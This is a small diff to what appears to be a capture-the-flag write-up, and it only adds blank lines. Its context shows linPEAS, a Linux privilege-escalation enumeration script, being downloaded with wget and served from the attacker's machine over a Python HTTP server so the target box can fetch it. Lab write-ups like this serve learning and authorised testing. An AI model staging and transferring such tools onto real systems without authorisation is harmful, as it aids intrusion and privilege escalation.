@@ -160,7 +160,9 @@ again we will download on our machine, upload a server and then download in the 
 in our machine:
 
 > wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
+
 > chmod +x linpeas.sh
+
 > python3 -m http.server 80
 
 in the box
